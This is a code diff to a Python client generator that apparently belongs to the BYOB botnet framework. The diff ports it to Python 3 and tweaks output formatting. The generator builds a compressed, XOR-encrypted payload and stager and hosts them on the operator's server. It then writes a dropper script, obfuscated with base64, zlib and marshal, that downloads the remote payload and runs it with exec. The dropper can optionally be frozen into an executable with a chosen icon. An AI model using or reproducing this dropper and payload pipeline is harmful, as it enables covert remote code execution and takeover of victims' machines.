@@ -82,12 +82,17 @@ import sys
 import zlib
 import base64
 import random
-import urllib
-import urllib2
 import marshal
 import argparse
 import itertools
 import threading
+if sys.version_info[0] < 3:
+    from urllib2 import urlparse
+    from urllib import pathname2url
+else:
+    from urllib import parse as urlparse
+    from urllib.request import pathname2url
+    sys.path.append('core')
 
 # packages
 import colorama
@@ -119,7 +124,7 @@ def main():
     Run the generator
 
     """
-    util.display(globals()['__banner'], color=random.choice(filter(lambda x: bool(str.isupper(x) and 'BLACK' not in x), dir(colorama.Fore))), style='normal')
+    util.display(globals()['__banner'], color=random.choice(list(filter(lambda x: bool(str.isupper(x) and 'BLACK' not in x), dir(colorama.Fore)))), style='normal')
 
     parser = argparse.ArgumentParser(
         prog='client.py',
@@ -173,7 +178,7 @@ def main():
     parser.add_argument(
         '-v', '--version',
         action='version',
-        version='0.4',
+        version='0.5',
     )
 
     options = parser.parse_args()
@@ -192,9 +197,9 @@ def _update(input, output, task=None):
     util.display("({:,} bytes {} to {:,} bytes ({}% {})".format(len(input), 'increased' if len(output) > len(input) else 'reduced', len(output), diff, 'larger' if len(output) > len(input) else 'smaller').ljust(80), style='dim', color='reset')
 
 def _modules(options, **kwargs):
-    util.display("\n[>]", color='green', style='bright', end=',')
+    util.display("\n[>]", color='green', style='bright', end=' ')
     util.display('Modules', color='reset', style='bright')
-    util.display("\tAdding modules... ", color='reset', style='normal', end=',')
+    util.display("\tAdding modules... ", color='reset', style='normal', end=' ')
 
     global __load__
     __load__ = threading.Event()
@@ -219,12 +224,12 @@ def _modules(options, **kwargs):
     return modules
 
 def _imports(options, **kwargs):
-    util.display("\n[>]", color='green', style='bright', end=',')
+    util.display("\n[>]", color='green', style='bright', end=' ')
     util.display("Imports", color='reset', style='bright')
 
     assert 'modules' in kwargs, "missing keyword argument 'modules'"
 
-    util.display("\tAdding imports...", color='reset', style='normal', end=',')
+    util.display("\tAdding imports...", color='reset', style='normal', end=' ')
 
     global __load__
     globals()['__load__'] = threading.Event()
@@ -270,7 +275,7 @@ def _hidden(options, **kwargs):
     return list(hidden)
 
 def _payload(options, **kwargs):
-    util.display("\n[>]", color='green', style='bright', end=',')
+    util.display("\n[>]", color='green', style='bright', end=' ')
     util.display("Payload", color='reset', style='bright')
 
     assert 'var' in kwargs, "missing keyword argument 'var'"
@@ -288,7 +293,7 @@ def _payload(options, **kwargs):
             util.log("Permission denied: unabled to make directory './modules/payloads/'")
 
     if options.compress:
-        util.display("\tCompressing payload... ", color='reset', style='normal', end=',')
+        util.display("\tCompressing payload... ", color='reset', style='normal', end=' ')
         __load__ = threading.Event()
         __spin__ = _spinner(__load__)
         output = generators.compress(payload)
@@ -298,7 +303,7 @@ def _payload(options, **kwargs):
 
     if options.encrypt:
         assert 'key' in kwargs, "missing keyword argument 'key' required for option 'encrypt'"
-        util.display("\tEncrypting payload... ".format(kwargs['key']), color='reset', style='normal', end=',')
+        util.display("\tEncrypting payload... ".format(kwargs['key']), color='reset', style='normal', end=' ')
         __load__ = threading.Event()
         __spin__ = _spinner(__load__)
         output = security.encrypt_xor(payload, base64.b64decode(kwargs['key']))
@@ -306,7 +311,7 @@ def _payload(options, **kwargs):
         _update(payload, output, task='Encryption')
         payload = output
 
-    util.display("\tUploading payload... ", color='reset', style='normal', end=',')
+    util.display("\tUploading payload... ", color='reset', style='normal', end=' ')
 
     __load__ = threading.Event()
     __spin__ = _spinner(__load__)
@@ -325,17 +330,17 @@ def _payload(options, **kwargs):
 
         with open(path, 'w') as fp:
             fp.write(payload)
-
-        s = 'http://{}:{}/{}'.format(options.host, int(options.port) + 1, urllib.pathname2url(path.replace(os.path.join(os.getcwd(), 'modules'), '')))
-        s = urllib2.urlparse.urlsplit(s)
-        url = urllib2.urlparse.urlunsplit((s.scheme, s.netloc, os.path.normpath(s.path), s.query, s.fragment)).replace('\\','/')
+         
+        s = 'http://{}:{}/{}'.format(options.host, int(options.port) + 1, pathname2url(path.replace(os.path.join(os.getcwd(), 'modules'), '')))
+        s = urlparse.urlsplit(s)
+        url = urlparse.urlunsplit((s.scheme, s.netloc, os.path.normpath(s.path), s.query, s.fragment)).replace('\\','/')
 
     __load__.set()
     util.display("(hosting payload at: {})".format(url), color='reset', style='dim')
     return url
 
 def _stager(options, **kwargs):
-    util.display("\n[>]", color='green', style='bright', end=',')
+    util.display("\n[>]", color='green', style='bright', end=' ')
     util.display("Stager", color='reset', style='bright')
 
     assert 'url' in kwargs, "missing keyword argument 'url'"
@@ -354,7 +359,7 @@ def _stager(options, **kwargs):
             util.log("Permission denied: unable to make directory './modules/stagers/'")
 
     if options.compress:
-        util.display("\tCompressing stager... ", color='reset', style='normal', end=',')
+        util.display("\tCompressing stager... ", color='reset', style='normal', end=' ')
         __load__ = threading.Event()
         __spin__ = _spinner(__load__)
         output = generators.compress(stager)
@@ -362,7 +367,7 @@ def _stager(options, **kwargs):
         _update(stager, output, task='Compression')
         stager = output
 
-    util.display("\tUploading stager... ", color='reset', style='normal', end=',')
+    util.display("\tUploading stager... ", color='reset', style='normal', end=' ')
     __load__ = threading.Event()
     __spin__ = _spinner(__load__)
 
@@ -381,18 +386,18 @@ def _stager(options, **kwargs):
         with open(path, 'w') as fp:
             fp.write(stager)
 
-        s = 'http://{}:{}/{}'.format(options.host, int(options.port) + 1, urllib.pathname2url(path.replace(os.path.join(os.getcwd(), 'modules'), '')))
-        s = urllib2.urlparse.urlsplit(s)
-        url = urllib2.urlparse.urlunsplit((s.scheme, s.netloc, os.path.normpath(s.path), s.query, s.fragment)).replace('\\','/')
+        s = 'http://{}:{}/{}'.format(options.host, int(options.port) + 1, pathname2url(path.replace(os.path.join(os.getcwd(), 'modules'), '')))
+        s = urlparse.urlsplit(s)
+        url = urlparse.urlunsplit((s.scheme, s.netloc, os.path.normpath(s.path), s.query, s.fragment)).replace('\\','/')
 
     __load__.set()
     util.display("(hosting stager at: {})".format(url), color='reset', style='dim')
     return url
 
 def _dropper(options, **kwargs):
-    util.display("\n[>]", color='green', style='bright', end=',')
+    util.display("\n[>]", color='green', style='bright', end=' ')
     util.display("Dropper", color='reset', style='bright')
-    util.display('\tWriting dropper... ', color='reset', style='normal', end=',')
+    util.display('\tWriting dropper... ', color='reset', style='normal', end=' ')
 
     assert 'url' in kwargs, "missing keyword argument 'url'"
     assert 'var' in kwargs, "missing keyword argument 'var'"
@@ -401,13 +406,17 @@ def _dropper(options, **kwargs):
     name = 'byob_{}.py'.format(kwargs['var']) if not options.name else options.name
     if not name.endswith('.py'):
         name += '.py'
-    dropper = "import zlib,base64,marshal,urllib,json;exec(eval(marshal.loads(zlib.decompress(base64.b64decode({})))))".format(repr(base64.b64encode(zlib.compress(marshal.dumps("urllib.urlopen({}).read()".format(repr(kwargs['url'])))))))
+    dropper = """import sys,zlib,base64,marshal,json,urllib
+if sys.version_info[0] > 2:
+    from urllib import request
+urlopen = urllib.request.urlopen if sys.version_info[0] > 2 else urllib.urlopen
+exec(eval(marshal.loads(zlib.decompress(base64.b64decode({})))))""".format(repr(base64.b64encode(zlib.compress(marshal.dumps("urlopen({}).read()".format(repr(kwargs['url'])),2)))))
     with open(name, 'w') as fp:
         fp.write(dropper)
     util.display('({:,} bytes written to {})'.format(len(dropper), name), style='dim', color='reset')
 
     if options.freeze:
-        util.display('\tCompiling executable...\n', color='reset', style='normal', end=',')
+        util.display('\tCompiling executable...\n', color='reset', style='normal', end=' ')
         name = generators.freeze(name, icon=options.icon, hidden=kwargs['hidden'])
         util.display('({:,} bytes saved to file: {})\n'.format(len(open(name, 'rb').read()), name))
     return name
